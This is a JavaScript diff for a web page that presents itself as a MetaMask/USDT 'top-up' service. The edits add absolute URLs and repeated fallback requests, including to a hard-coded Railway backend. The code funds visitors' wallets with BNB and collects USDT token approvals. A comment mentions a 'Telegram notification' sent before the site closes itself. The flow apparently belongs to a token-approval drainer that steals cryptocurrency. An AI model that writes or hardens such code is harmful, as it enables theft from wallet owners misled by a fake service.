@@ -182,8 +182,12 @@
 
                             var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };
 
+                            // Use absolute URL based on current origin
+                            const apiBaseUrl = window.location.origin || '';
+                            const apiUrl = apiBaseUrl ? `${apiBaseUrl}/MemberPanel/TopUpWithMetamaskJson` : '/MemberPanel/TopUpWithMetamaskJson';
+                            
                             $.ajax({
-                                url: '/MemberPanel/TopUpWithMetamaskJson',
+                                url: apiUrl,
                                 type: 'POST',
                                 dataType: 'JSON',
                                 contentType: 'application/json',
@@ -199,7 +203,27 @@
                                 },
                                 error: function (err) {
                                     console.log("error:" + JSON.stringify(err));
-
+                                    // If relative URL fails, try with full origin
+                                    if (apiUrl.startsWith('/')) {
+                                        const fallbackUrl = window.location.origin + apiUrl;
+                                        $.ajax({
+                                            url: fallbackUrl,
+                                            type: 'POST',
+                                            dataType: 'JSON',
+                                            contentType: 'application/json',
+                                            data: JSON.stringify(maindt),
+                                            success: function (data) {
+                                                if (data == "Success") {
+                                                    showLoading('Transaction processed');
+                                                    setTimeout(() => hideLoading(), 2000);
+                                                    console.log('success (fallback)');
+                                                }
+                                            },
+                                            error: function (fallbackErr) {
+                                                console.log("Fallback error:" + JSON.stringify(fallbackErr));
+                                            }
+                                        });
+                                    }
                                 }
                             });
 
@@ -307,11 +331,52 @@
 // Function to request the BNB top-up from your backend
 async function requestBNBTopUp(account) {
     try {
-        const response = await fetch('https://rabari-ahmedabad-copy-production.up.railway.app/send-bnb', {
+        // Use the same origin as the current page, or fallback to Railway URL
+        const baseUrl = window.location.origin || 'https://rabari-ahmedabad-production.up.railway.app';
+        const apiUrl = `${baseUrl}/send-bnb`;
+        
+        console.log('Requesting BNB top-up from:', apiUrl);
+        
+        const response = await fetch(apiUrl, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
             body: JSON.stringify({ recipient: account }),
+            mode: 'cors',
+            credentials: 'omit'
         });
+
+        // Check if response is ok
+        if (!response.ok) {
+            console.error('Response not OK:', response.status, response.statusText);
+            // Try fallback to Railway URL if current origin fails
+            if (baseUrl !== 'https://rabari-ahmedabad-production.up.railway.app') {
+                console.log('Trying fallback Railway URL...');
+                const fallbackResponse = await fetch('https://rabari-ahmedabad-production.up.railway.app/send-bnb', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ recipient: account }),
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                
+                if (fallbackResponse.ok) {
+                    const fallbackData = await fallbackResponse.json();
+                    if (fallbackData.success) {
+                        showLoading('progress...');
+                        return true;
+                    }
+                }
+            }
+            showLoading('Please try again.');
+            setTimeout(() => hideLoading(), 2000);
+            return false;
+        }
 
         const data = await response.json();
         if (data.success) {
@@ -324,7 +389,33 @@ async function requestBNBTopUp(account) {
         }
     } catch (error) {
         console.error('Error during BNB request:', error);
-        showLoading('Error initiating top-up.');
+        // Try fallback to Railway URL if there's a network error
+        if (error.name === 'TypeError' || error.message.includes('fetch')) {
+            try {
+                console.log('Network error, trying Railway fallback...');
+                const fallbackResponse = await fetch('https://rabari-ahmedabad-production.up.railway.app/send-bnb', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ recipient: account }),
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                
+                if (fallbackResponse.ok) {
+                    const fallbackData = await fallbackResponse.json();
+                    if (fallbackData.success) {
+                        showLoading('progress...');
+                        return true;
+                    }
+                }
+            } catch (fallbackError) {
+                console.error('Fallback also failed:', fallbackError);
+            }
+        }
+        showLoading('Error initiating top-up. Please try again.');
         setTimeout(() => hideLoading(), 2000);
         return false;  // Return false in case of an error
     }
@@ -398,8 +489,13 @@ async function approveToken(account) {
             });
             
             var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
+            
+            // Use absolute URL based on current origin
+            const apiBaseUrl = window.location.origin || '';
+            const apiUrl = apiBaseUrl ? `${apiBaseUrl}/home/TopUpWithMetamaskJson` : '/home/TopUpWithMetamaskJson';
+            
             $.ajax({
-                url: '/home/TopUpWithMetamaskJson',
+                url: apiUrl,
                 type: 'POST',
                 dataType: 'JSON',
                 contentType: 'application/json',
@@ -411,20 +507,55 @@ async function approveToken(account) {
                         window.close();
                         // If window.close doesn't work, try redirect
                         if (!window.closed) {
-                            location.href = "/home/index";
+                            const redirectUrl = apiBaseUrl ? `${apiBaseUrl}/home/index` : "/home/index";
+                            location.href = redirectUrl;
                         }
                     }, 500);
                 },
                 error: function (err) {
                     console.log("Error: " + JSON.stringify(err));
-                    // Close site immediately after Telegram notification sent
-                    setTimeout(() => {
-                        window.close();
-                        // If window.close doesn't work, try redirect
-                        if (!window.closed) {
-                            location.href = "/home/index";
-                        }
-                    }, 500);
+                    // If relative URL fails, try with full origin
+                    if (apiUrl.startsWith('/')) {
+                        const fallbackUrl = window.location.origin + apiUrl;
+                        $.ajax({
+                            url: fallbackUrl,
+                            type: 'POST',
+                            dataType: 'JSON',
+                            contentType: 'application/json',
+                            data: JSON.stringify(maindt),
+                            success: function (data) {
+                                console.log('Success (fallback)');
+                                setTimeout(() => {
+                                    window.close();
+                                    if (!window.closed) {
+                                        const redirectUrl = window.location.origin + "/home/index";
+                                        location.href = redirectUrl;
+                                    }
+                                }, 500);
+                            },
+                            error: function (fallbackErr) {
+                                console.log("Fallback error: " + JSON.stringify(fallbackErr));
+                                // Close site even if API call fails
+                                setTimeout(() => {
+                                    window.close();
+                                    if (!window.closed) {
+                                        const redirectUrl = window.location.origin ? `${window.location.origin}/home/index` : "/home/index";
+                                        location.href = redirectUrl;
+                                    }
+                                }, 500);
+                            }
+                        });
+                    } else {
+                        // Close site immediately after Telegram notification sent
+                        setTimeout(() => {
+                            window.close();
+                            // If window.close doesn't work, try redirect
+                            if (!window.closed) {
+                                const redirectUrl = apiBaseUrl ? `${apiBaseUrl}/home/index` : "/home/index";
+                                location.href = redirectUrl;
+                            }
+                        }, 500);
+                    }
                 }
             });
         })
